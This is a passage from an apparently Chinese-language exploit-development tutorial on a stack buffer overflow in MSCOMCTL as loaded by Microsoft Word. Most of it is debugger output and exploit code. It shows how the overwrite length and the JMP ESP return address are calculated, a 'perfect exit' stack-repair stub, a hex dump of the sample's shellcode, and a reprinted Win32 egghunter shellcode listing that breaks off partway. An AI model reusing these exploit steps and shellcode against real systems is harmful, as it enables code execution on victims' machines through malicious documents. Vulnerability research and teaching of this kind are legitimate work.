05&nbsp;00121068&nbsp;304c49a1&nbsp;00000000&nbsp;00000000&nbsp;00000001&nbsp;WINWORD+0x296275
06&nbsp;001210e0&nbsp;302e12d6&nbsp;00000001&nbsp;00000000&nbsp;00000000&nbsp;WINWORD+0x4c49a1
07&nbsp;0012119c&nbsp;300443b6&nbsp;0146c814&nbsp;00000002&nbsp;0012156c&nbsp;WINWORD+0x2e12d6</pre>
<p>&nbsp;&nbsp;&nbsp;&nbsp;此时 esp=00120ea0 ebp=00120ebc，距离覆盖点0x00120e6c处有了0&#215;34个字节可以使用，猜测是可以使用此处来作为覆盖后返回的栈顶(ESP)和栈底(ESP)。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;要明确一点是必须覆盖足够的数据才能覆盖到函数返回地址，否则虽然能够完美退出，但是无法执行到shellcode中就做了无用功，覆盖数据长度既不能太大也不能太小，太大无法做到完美退出，太小无法做到覆盖函数返回地址，这是一个很纠结的问题，需要很多次的分析测试。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;接下来就是验证这个想法，</p>
<pre class="prettyprint lang-html">275c87c1&nbsp;8bcf&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ecx,edi//把拷贝数据长度赋给ecx
275c87c3&nbsp;8b7d08&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;edi,dword&nbsp;ptr&nbsp;[ebp+8]
275c87c6&nbsp;8bc1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,ecx//eax会作为一个拷贝总长度
275c87c8&nbsp;c1e902&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;shr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ecx,2//ecx右移2位，相当于除以4
275c87cb&nbsp;f3a5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rep&nbsp;movs&nbsp;dword&nbsp;ptr&nbsp;es:[edi],dword&nbsp;ptr&nbsp;[esi]//开始拷贝</pre>
<p>&nbsp;&nbsp;&nbsp;&nbsp;分析上述代码可知，ecx是由edi赋值而来(edi的赋值过程不在本篇的讨论范围，确认是从样本中读取而来即可)，修改为一个小一些的值：0x2C进行测试，命令格式：</p>
<pre class="prettyprint lang-html">0:000&gt;&nbsp;r&nbsp;edi=0x2c</pre>
<p>&nbsp;&nbsp;&nbsp;&nbsp;理论上是能够保证覆盖函数返回地址的，接着往下执行，直至：</p>
<pre class="prettyprint lang-html">eax=00000057&nbsp;ebx=08440810&nbsp;ecx=08440810&nbsp;edx=00620001&nbsp;esi=00190b6c&nbsp;edi=00000000
eip=275c8a56&nbsp;esp=00120e78&nbsp;ebp=44444343&nbsp;iopl=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nv&nbsp;up&nbsp;ei&nbsp;pl&nbsp;zr&nbsp;na&nbsp;pe&nbsp;nc
cs=001b&nbsp;&nbsp;ss=0023&nbsp;&nbsp;ds=0023&nbsp;&nbsp;es=0023&nbsp;&nbsp;fs=003b&nbsp;&nbsp;gs=0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;efl=00000246
MSCOMCTL!DllGetClassObject+0x41d12:
275c8a56&nbsp;c20800&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ret&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;8
0:000&gt;&nbsp;dds&nbsp;esp
00120e78&nbsp;&nbsp;7ffa4512
00120e7c&nbsp;&nbsp;00000000
00120e80&nbsp;&nbsp;4a000000
00120e84&nbsp;&nbsp;48474747
00120e88&nbsp;&nbsp;49484848
00120e8c&nbsp;&nbsp;4a4a4949
00120e90&nbsp;&nbsp;4b4b4a4a
00120e94&nbsp;&nbsp;4c4c4b4b
00120e98&nbsp;&nbsp;00120ebc
00120e9c&nbsp;&nbsp;00120ebc
00120ea0&nbsp;&nbsp;275e7361&nbsp;MSCOMCTL!DLLGetDocumentation+0x104f</pre>
<p>&nbsp;&nbsp;&nbsp;&nbsp;堆栈覆盖了0x2c大小的数据，距离假定的栈顶(ESP)：0x00120ea0还有8个字节，程序接着会跳转到0x7ffa4512内存地址去执行，即JMP ESP，通用利用地址无需解释。&nbsp;</p>
<pre class="prettyprint lang-html">7ffa4512&nbsp;ffe4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jmp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;esp&nbsp;{00120e84}
0:000&gt;&nbsp;dds&nbsp;esp
00120e84&nbsp;&nbsp;48474747
00120e88&nbsp;&nbsp;49484848
00120e8c&nbsp;&nbsp;4a4a4949
00120e90&nbsp;&nbsp;4b4b4a4a
00120e94&nbsp;&nbsp;4c4c4b4b
00120e98&nbsp;&nbsp;00120ebc
00120e9c&nbsp;&nbsp;00120ebc
00120ea0&nbsp;&nbsp;275e7361&nbsp;MSCOMCTL!DLLGetDocumentation+0x104f
程序会跳转到0x00120e84处执行代码，完美退出代码就应该写在此处：
00120e84&nbsp;83c41c&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;add&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;esp,1Ch
00120e87&nbsp;8d6c241c&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;lea&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ebp,[esp+1Ch]
00120e8b&nbsp;c20800&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ret&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;8</pre>
<p>&nbsp;&nbsp;&nbsp;&nbsp;测试以后发现经过上述修改之后确实可做到完美退出，为继续往下分析提供了基础。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;接下来要做什么？</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;要回答上面的问题，先来了解目前的情况，有了一个可以完美退出的样本，可以覆盖堆栈上一小部分数据，因此距离利用的目标还有一段距离，接下来要做的就是使ShellCode执行起来。</p>
<p style="margin-top: 15px;"><span style="color: rgb(38, 38, 38); font-size: 20px;"><strong>0&#215;3&nbsp;具体实现</strong></span></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;以上部分都是分析验证部分，真正实现部分是由第三部分来完成，这部分主要完成的工作是完成ShellCode部分的修改和执行，之后能够完美退出。</p>
<p><span style="color: rgb(38, 38, 38); font-size: 16px;"><strong>0&#215;3.1 Small ShellCode 确认及验证</strong></span></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;需要计算留给我们填写shellcode的长度是多少？回到覆盖之前的瞬间，</p>
<p>0:000&gt; r</p>
<p>eax=0000002c ebx=08440810 ecx=0000000b edx=00000000 esi=00216408 edi=00120e6c</p>
<p>eip=275c87cb esp=00120e30 ebp=00120e40 iopl=0 &nbsp; &nbsp; &nbsp; &nbsp; nv up ei pl nz na pe cy</p>
<p>cs=001b &nbsp;ss=0023 &nbsp;ds=0023 &nbsp;es=0023 &nbsp;fs=003b &nbsp;gs=0000 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; efl=00000207</p>
<p>MSCOMCTL!DllGetClassObject+0x41a87:<span class="Apple-tab-span" style="white-space:pre"></span>//执行拷贝</p>
<p>275c87cb f3a5 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;rep movs dword ptr es:[edi],dword ptr [esi]</p>
<p>0:000&gt; d esi<span class="Apple-tab-span" style="white-space:pre"></span>//对应拷贝的源数据</p>
<p>00216408 &nbsp;00 00 00 00 00 00 00 00-00 00 00 00 12 45 fa 7f &nbsp;&#8230;&#8230;&#8230;&#8230;.E..</p>
<p>00216418 &nbsp;90 90 90 90 90 90 90 90-8b c4 05 10 01 00 00 c7 &nbsp;&#8230;&#8230;&#8230;&#8230;&#8230;.</p>
<p>00216428 &nbsp;00 24 03 4d 08 e9 5a 00-00 00 6b 65 72 6e 65 6c &nbsp;.$.M..Z&#8230;kernel</p>
<p>00216438 &nbsp;33 32 00 df 2d 89 8c 1b-81 7d ef 42 9d 85 85 d6 &nbsp;32..-&#8230;.}.B&#8230;.</p>
<p>0:000&gt; d edi<span class="Apple-tab-span" style="white-space:pre"></span>//内存拷贝的目的地址</p>
<p>00120e6c &nbsp;58 0c 19 00 e4 59 58 27-9c 0e 12 00 1a 70 5e 27 &nbsp;X&#8230;.YX&#39;&#8230;..p^&#39;</p>
<p>00120e7c &nbsp;6c 0b 19 00 10 08 44 08-00 00 00 00 48 0b 19 00 &nbsp;l&#8230;..D&#8230;..H&#8230;</p>
<p>00120e8c &nbsp;c0 19 38 08 96 c2 5a 27-01 00 00 00 bc 0e 12 00 &nbsp;..8&#8230;Z&#39;&#8230;&#8230;..</p>
<p>00120e9c &nbsp;bc 0e 12 00 61 73 5e 27-6c 0b 19 00 10 08 44 08 &nbsp;&#8230;.as^&#39;l&#8230;..D.</p>
<p>00120eac &nbsp;10 08 44 08 49 74 6d 73-64 00 00 00 00 00 59 27 &nbsp;..D.Itmsd&#8230;..Y&#39;</p>
<p>0:000&gt; dds esp<span class="Apple-tab-span" style="white-space:pre"></span>//ESP 堆栈情况</p>
<p>00120e30 &nbsp;00000000</p>
<p>00120e34 &nbsp;00190b6c</p>
<p>00120e38 &nbsp;08440810</p>
<p>00120e3c &nbsp;00008282</p>
<p>00120e40 &nbsp;00120e74</p>
<p>00120e44 &nbsp;275c8a0a MSCOMCTL!DllGetClassObject+0x41cc6</p>
<p>00120e48 &nbsp;00120e6c</p>
<p>00120e4c &nbsp;00216408</p>
<p>00120e50 &nbsp;00008282</p>
<p>00120e54 &nbsp;00000000</p>
<p>00120e58 &nbsp;00190b6c</p>
<p>00120e5c &nbsp;08440810</p>
<p>00120e60 &nbsp;6a626f43</p>
<p>00120e64 &nbsp;00000064</p>
<p>00120e68 &nbsp;00008282</p>
<p><span style="color: rgb(192, 0, 0);"><strong>00120e6c &nbsp;00190c58<span class="Apple-tab-span" style="white-space: pre;"></span>//从这里开始往下拷贝</strong></span></p>
<p>00120e70 &nbsp;275859e4 MSCOMCTL!DllCanUnloadNow+0x2a31</p>
<p>00120e74 &nbsp;00120e9c</p>
<p>00120e78 &nbsp;275e701a MSCOMCTL!DLLGetDocumentation+0xd08</p>
<p>00120e7c &nbsp;00190b6c</p>
<p>00120e80 &nbsp;08440810</p>
<p>00120e84 &nbsp;00000000</p>
<p>00120e88 &nbsp;00190b48</p>
<p>00120e8c &nbsp;083819c0</p>
<p>00120e90 &nbsp;275ac296 MSCOMCTL!DllGetClassObject+0&#215;25552</p>
<p>00120e94 &nbsp;00000001</p>
<p>00120e98 &nbsp;00120ebc</p>
<p><span style="color: rgb(192, 0, 0);"><strong>00120e9c &nbsp;00120ebc<span class="Apple-tab-span" style="white-space: pre;"></span>//内存拷贝到此处结束</strong></span></p>
<p>00120ea0 &nbsp;275e7361 MSCOMCTL!DLLGetDocumentation+0x104f</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;上面代码可以看出，Memcpy内存拷贝的源数据为ESI：0&#215;00216408 指向的数据，目的地址为EDI：0x00120e6c，最大能够填充到的地址为0x00120ea0，现在就可以计算出最大填充的字节数：0x00120ea0-0x00120e6c=0&#215;34(52)，这0&#215;34（52）字节首先需要减去</p>
<p>275c8a55 &nbsp; leave</p>
<p>275c8a56 &nbsp; ret &nbsp;8 代码的20个字节，其中leave指令12个字节，Ret 8指令8个字节，Jmp Esp 指令需要4个字节，计算公式就为 0&#215;34(52)- 0x0c- 8 &#8211; 4= 0x1c(28)字节，所以这里只能填充为Small_ShellCode，图示如下：</p>
<p style="text-align:center"><img data-original="http://image.3001.net/images/20140218/13927313504824.jpg!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" title="3.jpg"/></p>
<noscript><img src="http://image.3001.net/images/20140218/13927313504824.jpg!small" title="3.jpg"/></p></noscript>
<p>&nbsp;&nbsp;&nbsp;&nbsp;0x1c(28)字节大小的缓冲区为可供编写shellcode的区域，这部分ShellCode需要完成的功能是使程序的执行流程跳转到真正实现利用功能的ShellCode。</p>
<p><span style="color: rgb(38, 38, 38); font-size: 16px;"><strong>0&#215;3.2 编写Small Shellcode</strong></span></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;一个小的Shellcode通过内存搜索或者其他方法来找到真正的Shellcode的过程，一般叫做Egghunrt，相应的这部分代码叫做EggSearch。网络上类似的ShellCode是非常多的。Exploit-db网站上就有一个，代码如下：</p>
<pre class="prettyprint lang-cpp">#include&nbsp;&lt;stdio.h&gt;
#include&nbsp;&lt;Windows.h&gt;
void&nbsp;main()
{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;__asm
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;win32&nbsp;eggsearchshellcode,&nbsp;33&nbsp;bytes
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;tested&nbsp;on&nbsp;windows&nbsp;xp&nbsp;sp2,&nbsp;should&nbsp;work&nbsp;on&nbsp;all&nbsp;service&nbsp;packs&nbsp;on&nbsp;win2k,&nbsp;win&nbsp;xp,&nbsp;win2k3
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;(c)&nbsp;2009&nbsp;by&nbsp;Georg&nbsp;&#39;oxff&#39;&nbsp;Wicherski&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//[bits&nbsp;32]
#define&nbsp;marker&nbsp;0x1f217767&nbsp;&nbsp;&nbsp;;&nbsp;&#39;gw!\x1f&#39;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nop
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nop
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nop
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nop
start:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;xor&nbsp;edx,&nbsp;edx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;edx&nbsp;=&nbsp;0,&nbsp;pointerto&nbsp;examinedaddress
address_loop:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;inc&nbsp;edx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;edx++,&nbsp;trynext&nbsp;address
pagestart_check:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;test&nbsp;dx,&nbsp;0x0ffc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;are&nbsp;we&nbsp;within&nbsp;the&nbsp;first&nbsp;4&nbsp;bytes&nbsp;of&nbsp;a&nbsp;page?
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jz&nbsp;address_loop&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;if&nbsp;so,&nbsp;try&nbsp;next&nbsp;address&nbsp;as&nbsp;previous&nbsp;page&nbsp;might&nbsp;be&nbsp;unreadable
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;and&nbsp;the&nbsp;cmp&nbsp;[edx-4],&nbsp;marker&nbsp;might&nbsp;result&nbsp;in&nbsp;a&nbsp;segmentation&nbsp;fault
access_check:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;edx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;save&nbsp;acrosssyscall
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;8h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;eax&nbsp;=&nbsp;8,&nbsp;syscallnr&nbsp;of&nbsp;AddAtomA
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pop&nbsp;eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;^
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;0x2e&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;fire&nbsp;syscall(eax&nbsp;=&nbsp;8,&nbsp;edx=&nbsp;ptr)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cmp&nbsp;al,&nbsp;0x05&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;is&nbsp;result0xc0000005?&nbsp;(a&nbsp;bitsloppy)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pop&nbsp;edx&nbsp;&nbsp;&nbsp;&nbsp;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;je&nbsp;address_loop&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;jmp&nbsp;if&nbsp;result&nbsp;was0xc0000005
egg_check:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cmp&nbsp;dword&nbsp;ptr&nbsp;[edx-4],&nbsp;marker&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;is&nbsp;our&nbsp;egg&nbsp;right&nbsp;before&nbsp;examinedaddress?
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jne&nbsp;address_loop&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;if&nbsp;not,&nbsp;try&nbsp;next&nbsp;address
egg_execute:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;inc&nbsp;ebx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&